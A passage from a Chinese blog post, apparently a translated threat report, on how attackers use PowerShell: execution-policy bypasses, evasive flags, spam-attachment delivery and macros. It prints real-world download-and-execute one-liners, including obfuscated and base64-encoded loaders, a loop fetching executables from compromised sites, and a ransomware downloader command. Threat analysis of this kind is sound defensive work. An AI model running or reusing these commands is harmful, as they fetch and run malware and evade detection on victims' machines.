@@ -1,0 +1,1271 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>powershell备忘单2</title>
+    <meta name="description" content="">
+
+    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
+    <link rel="stylesheet" href="/css/main.css ">
+    <link rel="canonical" href="http://localhost:4000/2017/10/08/powershell2/">
+    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">
+
+
+    <script>
+    // 百度统计代码
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+
+    <script>
+    // google analytics
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-111240288-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+
+
+</head>
+
+
+  <body>
+
+    <header id="top">
+    <div class="wrapper">
+        <a href="/" class="brand">Jirairya</a>
+        <small></small>
+        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
+        <nav id="headerNav">
+            <ul>
+                <li>
+                    
+                    <a href="/">
+                    
+                        <i class="fa fa-home"></i>Home
+                    </a>
+                </li>
+
+                
+                    
+                    <li>
+                        
+                        <a href="/archive/">
+                        
+                            <i class="fa fa-archive"></i>Archives
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/category/">
+                        
+                            <i class="fa fa-th-list"></i>Categories
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tag/">
+                        
+                            <i class="fa fa-tags"></i>Tags
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/collections/">
+                        
+                            <i class="fa fa-folder-open"></i>Collections
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/skills/">
+                        
+                            <i class="fa fa-bezier-curve"></i>Skills
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tools/">
+                        
+                            <i class="fa fa-toolbox"></i>Tools
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/about/">
+                        
+                            <i class="fa fa-paper-plane"></i>About
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="page clearfix" post>
+    <div class="left">
+        <h1>powershell备忘单2</h1>
+        <div class="label">
+
+            <div class="label-card">
+                <i class="fa fa-calendar"></i>2017-10-08
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+            
+
+
+<!-- <span class="point">•</span> -->
+<span class="categories">
+  <i class="fa fa-th-list"></i>
+  
+    
+        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
+    
+        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>&nbsp;
+    
+        <a href="/category/#windows" title="Category: windows" rel="category">windows</a>
+    
+  
+
+  <!-- <span class="point">•</span> -->
+</span>
+
+
+            </div>
+
+            <div class="label-card">
+            
+<!-- <span class="point">•</span> -->
+<span class="pageTag">
+  <i class="fa fa-tags"></i>
+  
+    
+        <!--a href="/tag/#windows" title="Tag: windows" rel="tag">windows</a-->
+        <a href="/tag/#windows" title="Tag: windows" rel="tag">windows</a>&nbsp;
+    
+        <!--a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a-->
+        <a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a>&nbsp;
+    
+        <!--a href="/tag/#command" title="Tag: command" rel="tag">command</a-->
+        <a href="/tag/#command" title="Tag: command" rel="tag">command</a>&nbsp;
+    
+        <!--a href="/tag/#powershell" title="Tag: powershell" rel="tag">powershell</a-->
+        <a href="/tag/#powershell" title="Tag: powershell" rel="tag">powershell</a>
+    
+  
+
+</span>
+
+            </div>
+
+        </div>
+        <hr>
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+        <ul id="markdown-toc">
+  <li><a href="#powershell在攻击中的不同阶段使用" id="markdown-toc-powershell在攻击中的不同阶段使用">PowerShell在攻击中的不同阶段使用</a>    <ul>
+      <li><a href="#execution-policy执行策略" id="markdown-toc-execution-policy执行策略">EXECUTION POLICY(执行策略)</a>        <ul>
+          <li><a href="#script-execution脚本执行" id="markdown-toc-script-execution脚本执行">SCRIPT EXECUTION（脚本执行）</a></li>
+        </ul>
+      </li>
+      <li><a href="#powershell-威胁如何使用标志" id="markdown-toc-powershell-威胁如何使用标志">PowerShell 威胁如何使用标志</a>        <ul>
+          <li><a href="#office-macros" id="markdown-toc-office-macros">office macros</a></li>
+          <li><a href="#exploits" id="markdown-toc-exploits">Exploits</a></li>
+        </ul>
+      </li>
+      <li><a href="#lateral-movement横向渗透" id="markdown-toc-lateral-movement横向渗透">LATERAL MOVEMENT（横向渗透）</a>        <ul>
+          <li><a href="#enter-pssession" id="markdown-toc-enter-pssession">Enter-PSSession</a></li>
+          <li><a href="#wmi" id="markdown-toc-wmi">WMI</a></li>
+          <li><a href="#profile-injection配置文件注入" id="markdown-toc-profile-injection配置文件注入">Profile injection(配置文件注入)</a></li>
+          <li><a href="#other-methods" id="markdown-toc-other-methods">Other methods</a></li>
+        </ul>
+      </li>
+      <li><a href="#persistence持久控制" id="markdown-toc-persistence持久控制">PERSISTENCE（持久控制）</a>        <ul>
+          <li><a href="#poweliks" id="markdown-toc-poweliks">Poweliks</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#obfuscation混淆" id="markdown-toc-obfuscation混淆">OBFUSCATION(混淆)</a>    <ul>
+      <li><a href="#混淆方法" id="markdown-toc-混淆方法">混淆方法</a></li>
+      <li><a href="#anti-obfuscation反混淆" id="markdown-toc-anti-obfuscation反混淆">ANTI-OBFUSCATION(反混淆)</a></li>
+      <li><a href="#disguising-scripts伪装脚本" id="markdown-toc-disguising-scripts伪装脚本">DISGUISING SCRIPTS(伪装脚本)</a></li>
+    </ul>
+  </li>
+</ul>
+
+<!--more-->
+
+<h2 id="powershell在攻击中的不同阶段使用">PowerShell在攻击中的不同阶段使用</h2>
+
+<p>这个章节将会显示使用 pwershell 在不同阶段的攻击，什么框架支持攻击者达到目标，和攻击者面临的挑战。</p>
+
+<h3 id="execution-policy执行策略">EXECUTION POLICY(执行策略)</h3>
+
+<p>默认情况下，微软使用执行策略限制 powershell 脚本，一共有五个选项分别为用户或计算机设置：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Restricted   限制 
+AllSigned    所有的签名 
+RemoteSigned  远程签名 
+Unrestricted 无限制 Bypass  
+</code></pre></div></div>
+<p>没有为安全设计的功能，而只是防止用户意外的执行脚本。这些策略有助于防止用户被社会工程学攻击诱骗执行恶意脚本。当一个用户启动一个 ps1 脚本，他将在记事本中打开，而不是执行。</p>
+
+<p>默认执行策略是 Restricted. 除了 Windows Server2012R2，它是RemoteSigned。Restrcted 策略仅仅准许交互式powershell会话，和单个命令，无论脚本来自何处或是否经过数字签名和信任。组织可以根据自己的需要在自己环境中配置不同的策略。策略可以设置使用不同的范围，如Machinepolicy  、Userpolicy, Process、CurrentUser、或者LocalMachine。微软提供更多关于怎么样为每个作用域设置执行策略。（ Get-ExecutionPolicy为获取当前策略，Set-ExecutionPolicy 为设置策略）</p>
+
+<p>然而，攻击者有很多方法可以用来bypass这些执行策略。最常见到的是：通过管道方式将脚本内容插入 powershell.exe 的标准输入内。例如 type 命令例子：<code class="highlighter-rouge">Type myscript.ps1 | powershell.exe –noprofile -</code></p>
+
+<blockquote>
+  <p>（译者注：-noprofile 为不加载 windows powershell 配置文件，也可以简写为-NoP，更多参数可以输入 powershell –help 查看）</p>
+</blockquote>
+
+<p>使用命令参数来执行单个命令，这样就不受执行策略限制。还可以下载并且执行其它脚本。例子：</p>
+
+<p><code class="highlighter-rouge">Powershell.exe     –command    “iex(New-Object 
+Net.WebClient).DownloadString(‘http://[REMOVED]/myscript.ps1’)”</code></p>
+
+<blockquote>
+  <p>(译者注：-command 为参数，自己设置) 使用 EncodedCommand 参数可以执行一个 Base64 编码的命令。</p>
+</blockquote>
+
+<p>同样不会受执行策略限制。例子：</p>
+
+<p><code class="highlighter-rouge">Powershell.exe –enc [ENCODED COMMAND]  </code></p>
+
+<blockquote>
+  <p>(译者注:ENCODED COMMAND 为将 ps1 脚本编码后的字符)用执行策略并将”bypass”或”unrestricted”作为参数。例子： <code class="highlighter-rouge">Powershell.exe –ExecutionPolicy bypass –File myscript.ps1</code></p>
+</blockquote>
+
+<p>如果攻击者可以访问交互式 powershell 会话，那么他们可以用其它方法，如 Invoke-Command 或简单的将脚本黏贴或者剪切到会话中。</p>
+
+<p>如果攻击者可以执行在受威胁的计算机上执行代码，他们可以修改注册表中的执行策略，存储在下面的项中: 
+<code class="highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell </code></p>
+
+<h4 id="script-execution脚本执行">SCRIPT EXECUTION（脚本执行）</h4>
+
+<p>在多数情况下，powershell 脚本使用 post-exploitation 作为下载器为附加的 payloads。当 Restricted 执行策略阻止用户运行.ps1扩展的powershell脚本时，攻击者可以用其它的扩展来准许他们的脚本执行Powershell接收一个参数列表，在大多数情况下，恶意脚本用下面的参数来躲避检测和 bypass 本地限制。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">Nop</span><span class="o">/-</span><span class="n">NoProfile</span> <span class="p">(</span><span class="err">忽略配置文件中的命令</span><span class="p">)</span> 
+<span class="o">-</span><span class="n">Enc</span><span class="o">/-</span><span class="n">EncodedCommand</span><span class="p">(</span><span class="err">运行经过</span> <span class="n">base64</span> <span class="err">编码的命令</span><span class="p">)</span> 
+<span class="o">-</span><span class="n">W</span> <span class="n">Hidden</span><span class="o">/-</span><span class="n">WindowStyle</span><span class="p">(</span><span class="err">隐藏命令窗口</span><span class="p">)</span> 
+<span class="o">-</span><span class="n">Exec</span> <span class="n">bypass</span><span class="o">/-</span><span class="n">ExecutionPolicu</span> <span class="n">Bypass</span><span class="p">(</span><span class="err">忽略执行策略限制</span><span class="p">)</span> 
+<span class="o">-</span><span class="n">NonI</span><span class="o">/-</span><span class="n">NonInteractive</span><span class="p">(</span><span class="err">不显示交互信息</span><span class="p">)</span> 
+<span class="o">-</span><span class="n">C</span><span class="o">/-</span><span class="n">Cmmand</span><span class="p">(</span><span class="err">运行单个命令</span><span class="p">)</span> 
+<span class="o">-</span><span class="n">F</span><span class="o">/-</span><span class="n">File</span><span class="p">(</span><span class="err">从指定文件中运行命令</span><span class="p">)</span> 
+</code></pre></div></div>
+
+<p>因为 powershell 自动将<code class="highlighter-rouge">*</code>字符加入到参数标志中，很多不关键字可以被缩写，比如，不用输入<code class="highlighter-rouge">-EncodedCommand</code>,可以直接输入<code class="highlighter-rouge">-enco</code>或者<code class="highlighter-rouge">-encodedc</code>都是可以的，这将会很难自动识别命令参数。在进行模式匹配时应牢记。</p>
+
+<p>到目前为止，我们还没有在攻击中使用版本参数，这将使准许攻击者降低计算机中的 powershell 到一个比较旧的版本，它不能像新版本的那样记录。比如”-version2.0”，我们也没有看到恶意软件使用 PSConsoleFile 命令，加载指定的 powershell 控制文件。</p>
+
+<p>在恶意 powershell 脚本中，最常见在命令行中使用的命令和函数：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">()</span> 
+<span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">()</span> 
+<span class="o">-</span><span class="n">IEX</span> <span class="o">/</span> <span class="o">-</span><span class="n">Invoke</span><span class="o">-</span><span class="n">Expression</span> 
+<span class="n">Start</span><span class="o">-</span><span class="n">Process</span> 
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">System.Net Webclientl</code>类是用来向远程发送数据，或者接收数据。这对大多数威胁都是至关重要的，这个类包含 DownloadFile 方法，它可以从远程下载一个文件到存到本地， Download-String方法可以将远程的内容下载到内存中的缓冲区。下面的命令可以从远程下载并且执行脚本 ：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Powershell</span><span class="p">.</span><span class="n">exe</span> <span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="err">$</span><span class="n">URL</span><span class="p">,</span><span class="err">$</span><span class="n">LocalFileLocation</span><span class="p">);</span><span class="n">Start</span><span class="o">-</span><span class="n">Process</span> <span class="err">$</span><span class="n">LocalFileLocation</span> 
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">WebClient API </code>方法 DownloadString 和 DownloadFile，不仅仅是这些方法可以从远程位置下载内容，<code class="highlighter-rouge">Invoke-WebRequest</code>，<code class="highlighter-rouge">BitsTransfer</code>,<code class="highlighter-rouge">Net.Sockets.TCPClient</code>,和更多的方法都可以提供相似的功能。但是 WebClient 是目前为止最常用的一个。</p>
+
+<p>一旦 payload被下载或者混淆，该脚本通常使用其它方法来运行附加代码。有多种方法可以从powershell 开始新的进程。最常用的方式是 Invoke-Expression 和 Start-Process。<code class="highlighter-rouge">Invoke-Expression</code>允许用户计算和运行动态生成的命令。此方法通常用于直接下载到内存的脚本。</p>
+
+<p>我们也看到威胁使用<code class="highlighter-rouge"> Invoke-WMIMethod </code>和 <code class="highlighter-rouge">New-Service </code>或者为 WScript 或 shell 应用创建一个新的 COM 对象以执行 payload，它们通常像下面这样： 
+<code class="highlighter-rouge">(New-Object –com shell.application).ShellExecute() </code></p>
+
+<p>攻击者还可以直接调用外部函数，比如CreateThread或者丢弃批处理文件来执行它们（这句我也不是很懂）。例如，我们发现一个威胁用<code class="highlighter-rouge">System.Diagnostics.ProcessStartInfo</code>对象来创建一个新的后台进程。</p>
+
+<p>如前所述，powershell 可以用于从内存中直接加载和运行任何 pe 文件。多数脚本重用
+ReflectivePEInjection 模块，这是在 2013 年推出，其中最长用的一个 payloads 是 dump 密码工具。 
+下面的例子展示了常用的 powershell 下载者的调用，我们在野外遇到：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Powershell</span>  <span class="err">–</span><span class="n">w</span>  <span class="n">hidden</span>  <span class="err">–</span><span class="n">ep</span>     <span class="n">bypass</span>  <span class="err">–</span><span class="n">nop</span>    <span class="err">–</span><span class="n">c</span>  <span class="err">“</span><span class="n">IEX</span>    <span class="p">((</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> 
+<span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="err">‘</span><span class="n">http</span><span class="o">:</span><span class="c1">//pastebin.com/raw/[REMOVED]’))” 
+</span></code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Powershell</span><span class="p">.</span><span class="n">exe</span> <span class="err">–</span><span class="n">window</span> <span class="n">hidden</span> <span class="err">–</span><span class="n">enc</span> <span class="n">KABOAG</span><span class="p">[</span><span class="n">REMOVED</span><span class="p">]</span> 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cmd.exe /C powershell <span class="nv">$random</span> <span class="o">=</span> New-Object System. Random<span class="p">;</span> Foreach<span class="o">(</span><span class="nv">$url</span> <span class="k">in</span> @<span class="o">({</span>http://[REMOVED]academy. com/wp-content/themes/twentysixteen/st1.exe<span class="o">}</span>,<span class="o">{</span>http:// <span class="o">[</span>REMOVED].com.au/wp-content/plugins/espresso-social/ st1.exe<span class="o">}</span>,<span class="o">{</span>http://[REMOVED].net/wp-includes/st1. exe<span class="o">}</span>,<span class="o">{</span>http://[REMOVED]resto.com/wp-content/plugins/ wp-super-cache/plugins/st1.exe<span class="o">}</span>,<span class="o">{</span>http://[REMOVED]. ru/wp-content/themes/twentyeleven/st1.exe<span class="o">}))</span> <span class="o">{</span> try <span class="o">{</span> <span class="nv">$rnd</span> <span class="o">=</span> <span class="nv">$random</span>.Next<span class="o">(</span>0, 65536<span class="o">)</span><span class="p">;</span> <span class="nv">$path</span> <span class="o">=</span> ‘%tmp%<span class="se">\’</span> + <span class="o">[</span>string] <span class="nv">$rnd</span> + ‘.exe’<span class="p">;</span> <span class="o">(</span>New-Object System.Net. WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="nv">$url</span>.ToString<span class="o">()</span>, <span class="nv">$path</span><span class="o">)</span><span class="p">;</span>Start-Process <span class="nv">$path</span><span class="p">;</span> <span class="nb">break</span><span class="p">;</span> <span class="o">}</span> catch <span class="o">{</span> Write-Host<span class="nv">$error</span><span class="o">[</span>0].Exception <span class="o">}</span> <span class="o">}</span> 
+</code></pre></div></div>
+
+<blockquote>
+  <p>(译者注:上面这段代码意思是用 cmd 去调用 powershell，然后几个网址中下载 exe 文件，并且随机命名保存到本地，并执行，就是一个下载者吧)</p>
+</blockquote>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">c</span> <span class="n">pow</span><span class="o">^</span><span class="n">eRSheLL</span><span class="o">^</span><span class="p">.</span><span class="n">eX</span><span class="o">^</span><span class="n">e</span> <span class="o">^-</span><span class="n">e</span><span class="o">^</span><span class="n">x</span><span class="o">^</span><span class="n">ec</span><span class="o">^</span><span class="n">u</span><span class="o">^</span><span class="n">tI</span><span class="o">^</span><span class="n">o</span><span class="o">^</span><span class="n">nP</span><span class="o">^</span><span class="n">OLIcY</span><span class="o">^</span> <span class="n">ByP</span><span class="o">^</span><span class="n">a</span><span class="o">^</span><span class="n">S</span><span class="o">^</span><span class="n">s</span> <span class="o">-</span><span class="n">nOProf</span><span class="o">^</span><span class="n">I</span><span class="o">^</span><span class="n">L</span><span class="o">^</span><span class="n">e</span><span class="o">^</span>
+<span class="o">-^</span><span class="n">WIndoWST</span><span class="o">^</span><span class="n">YLe</span> <span class="n">H</span><span class="o">^</span><span class="n">i</span><span class="o">^</span><span class="n">D</span><span class="o">^</span><span class="n">de</span><span class="o">^</span><span class="n">N</span> <span class="o">^</span><span class="p">(</span><span class="n">ne</span><span class="o">^</span><span class="n">w</span><span class="o">-</span><span class="n">O</span><span class="o">^</span><span class="n">BJe</span><span class="o">^</span><span class="n">c</span><span class="o">^</span><span class="n">T</span><span class="o">^</span><span class="n">SY</span><span class="o">^</span><span class="n">STeM</span><span class="p">.</span><span class="n">Ne</span><span class="o">^</span><span class="n">T</span><span class="o">^</span><span class="p">.</span><span class="o">^</span><span class="n">w</span><span class="o">^</span><span class="n">eB</span><span class="o">^</span><span class="n">cLie</span><span class="o">^</span><span class="n">n</span><span class="o">^</span><span class="n">T</span><span class="o">^</span><span class="p">).</span><span class="o">^</span><span class="n">Do</span><span class="o">^</span><span class="n">W</span><span class="o">^</span><span class="n">nlo</span><span class="o">^</span><span class="n">aDfi</span><span class="o">^</span><span class="n">Le</span><span class="p">(</span><span class="o">^</span><span class="err">’</span><span class="n">http</span><span class="o">:</span><span class="c1">// www. [REMOVED].top/user.php?f=1.dat’,^’%USERAPPDATA.eXe’);s^T^ar^T-^PRO^ce^s^S^ ^%USERAPPDATA%.exe 
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>　(译者注:这段代码也是下载一个 exe 并且执行，但是用了大小写和插入格式符进行混淆)</p>
+</blockquote>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">iex</span> <span class="err">$</span><span class="n">env</span><span class="o">:</span><span class="n">nlldxwx</span>  <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">NoP</span> <span class="o">-</span><span class="n">NonI</span> <span class="o">-</span><span class="n">W</span> <span class="n">Hidden</span> <span class="o">-</span><span class="n">Exec</span> <span class="n">Bypass</span> <span class="o">-</span><span class="n">Command</span> <span class="err">“</span><span class="n">Invoke</span><span class="o">-</span><span class="n">Expression</span> <span class="err">$</span><span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">StreamReader</span> <span class="p">(</span><span class="err">$</span><span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span> <span class="n">DeflateStream</span> <span class="p">(</span><span class="err">$</span><span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span> <span class="p">(,</span><span class="err">$</span><span class="p">([</span><span class="n">Convert</span><span class="p">]</span><span class="o">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="err">\”</span><span class="p">[</span><span class="n">REMOVED</span><span class="p">]</span><span class="err">\”</span> <span class="p">)))),[</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">CompressionMode</span><span class="p">]</span><span class="o">::</span><span class="n">Decompress</span><span class="p">)),[</span><span class="n">Text</span><span class="p">.</span><span class="n">Encoding</span><span class="p">]</span><span class="o">::</span><span class="n">ASCII</span><span class="p">)).</span><span class="n">ReadToEnd</span><span class="p">();</span><span class="err">”</span> 
+</code></pre></div></div>
+
+<blockquote>
+  <p>(译者注:大概意思是将远程的 base64 编码过的 ps 代码中进行压缩传输保存在内存中并直接执行)</p>
+</blockquote>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">ExecutionPolicy</span> <span class="n">Unrestricted</span> <span class="o">-</span><span class="n">File</span> 
+<span class="err">“</span><span class="o">%</span><span class="n">TEMP</span><span class="o">%</span><span class="err">\</span><span class="n">ps</span><span class="p">.</span><span class="n">ps1</span><span class="err">”</span> 
+</code></pre></div></div>
+
+<blockquote>
+  <p>(译者注:用 Unrestricted 不受限制的策略执行脚本文件)</p>
+</blockquote>
+
+<h3 id="powershell-威胁如何使用标志">PowerShell 威胁如何使用标志</h3>
+
+<p>为了了解标志的使用频率，我们分析通过我们沙箱运行的脚本，我们发现有三分之一的样本设置了 NoProfile 标志。</p>
+
+<p>近一半(48%)的样品使用 “iex $env:randomname”,这是因为 Kotver 恶意软件在这段时间组成了许多分析样本。这个威胁家族用这个环境变量来隐藏命令行记录器中的脚本。</p>
+
+<p>23%的样本中使用了 DownloadFile 函数 在第一层。一些脚本使用了多层 Base64 编码，这
+是没有计算在这个分析里。隐藏函数 DownloadString 仅仅在少于 1%的情况下使用。</p>
+
+<p>大约 89%使用了 “Bypass”和 11%使用了”Unrestricted”作为参数结合执行策略标志。集合所有的恶意软件家族没有随机化标志的顺序。 
+电子邮件是 powershell下载者最常见的传播手段，我们观察到垃圾邮件中经常在.zip包中，包含 powershell 脚本文件，这些文件有以下扩展:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">lnk</span>   <span class="p">.</span><span class="n">wsf</span>   <span class="p">.</span><span class="n">hta</span>    <span class="p">.</span><span class="n">mhtml</span>    <span class="p">.</span><span class="n">html</span>    <span class="p">.</span><span class="n">doc</span>    <span class="p">.</span><span class="n">docm</span>    <span class="p">.</span><span class="n">xls</span>    <span class="p">.</span><span class="n">xlsm</span>   <span class="p">.</span><span class="n">ppt</span>   <span class="p">.</span><span class="n">pptm</span>  
+<span class="p">.</span><span class="n">chm</span>    <span class="p">.</span><span class="n">vbs</span>    <span class="p">.</span><span class="n">js</span>    <span class="p">.</span><span class="n">bat</span>    <span class="p">.</span><span class="n">pif</span>    <span class="p">.</span><span class="n">pdf</span>    <span class="p">.</span><span class="n">jar</span> 
+</code></pre></div></div>
+
+<p>在过去的六个月里，javascript 是阻止次数最多的电子邮件附件类型，平均每天我们阻止 466,028 封含 jacascript 恶意附件的邮件。第二阻止最多的是.html，接下来是.vbs 和.doc。所有这些类型都能够执行 powershell 脚本，直接或者间接。</p>
+
+<p>如果用户打开这些附件，powershell脚本将会启动，有些文件类型类似.lnk和.wsf，也可以直接执行 powershell 脚本，另外像.hta，运行一个 javascript 或者 VBScript 来调用 powershellpayload。Cmd.exe，WScript，CScript，MShta，或者 WMI 这些都是用于执行 powershell 脚本的常用方法。</p>
+
+<p>这些附件可能会增加密码保护来绕过网关安全设备，这些密码会包含在邮件内容里，攻击者用社会工程学方法来诱骗用户打开附件并启用其内容。 我们分析了未在防护链中阻止的 powershell 脚本，例如通过 IPS 签名，或者垃圾邮件过滤系统，这些脚本到达用户计算机并尝试运行，从 2016 年到现在，赛门铁克的基于行为保护的系统发现了10,797个powershell脚本执行。总数包含有良性脚本，这当然没有被阻止。总共弄有55的脚本通过cmd.exe来调用运行。如果我们仅仅统计恶意脚本，那么有 95%是通过 cmd.exe 来调用的。</p>
+
+<p>该被注意的是在目标计算机上执行之前，大多数宏恶意下载被阻止，所以它们还没到触发我们的行为保护系统。<code class="highlighter-rouge">Nemucod downloader </code>一个使用powershell的威胁例子是js.Nemucod，它下载(Ransom.Locky)勒索软件的变体。该威胁通过垃圾邮件的.zip附件包含.wsf文件，大量这些邮件在 2016 年 7 月发送。赛门铁克阻止这些垃圾邮件每天超过 130 万。</p>
+
+<p>.wsf 文件使用加密 Javascript 来下载 payload。这些文件还利用了一个条件编译技巧 (@cc_on)，这是一个 jscript 在 IE 中的功能。由于许多安全扫描程序不知道@cc_on标签，它们认为它是注释而忽略了代码，因此无法检测这个威胁。</p>
+
+<p>这个攻击活动背后的团队在 10 月初改变了战术，开始发送含有.lnk的邮件。使用社会工程学技巧，声称该附件是一个发票，当这个附件被执行，它会执行一个powershell命令去下载勒索软件，下面是一个 powershell 命令的例子:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Powershell</span><span class="p">.</span><span class="n">exe</span> <span class="err">–</span><span class="n">windowstyle</span> <span class="n">hidden</span> <span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">ObjectSystem</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">.</span><span class="n">DownloadFile</span><span class="p">(</span><span class="err">‘</span><span class="n">http</span><span class="o">:</span><span class="c1">//[REMOVED]’,’%Temp%\[RANDOM].exe’);StartProcess ‘%Temp%\[RANDOM].exe’ 
+</span></code></pre></div></div>
+
+<h4 id="office-macros">office macros</h4>
+
+<p>另外一种常见的感染方式是使用 office 文档的宏，在 2016 年卷土重来，攻击者使用社会工程学构造的邮件去欺骗用户开启并执行宏。恶意宏通常执行一些测试来验证是否在计算机上运行，而不是安全研究员的虚拟机里。它可以通过运行 Application.RecentFiles.Count检查最近的文件是否已打开，一旦宏验证是计算机,它马上下载其它的 powershell脚本，不幸的是这种行为本身不是恶意的，正如我们看到合法的宏释放并执行良性脚本。</p>
+
+<p>而且，宏代码不需要包含恶意脚本。我们看到存储在表单元格或元数据中的恶意脚本，宏代码会读取这些数据并执行它们。比如下面这个作者属性字段区域:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">Author:</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>  <span class="err">–</span><span class="n">nop</span>    <span class="err">–</span><span class="n">w</span>  <span class="n">hidden</span>  <span class="err">–</span><span class="n">c</span>  <span class="err">“</span><span class="n">IEX</span>    <span class="p">((</span><span class="n">NEW</span><span class="o">-</span><span class="n">object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="err">‘</span><span class="n">http</span><span class="o">:</span><span class="c1">//192.168.0.42:80/a’))”
+</span></code></pre></div></div>
+
+<p>下面是另一个宏读取作者属性字段的示例，并且有经过混淆:</p>
+
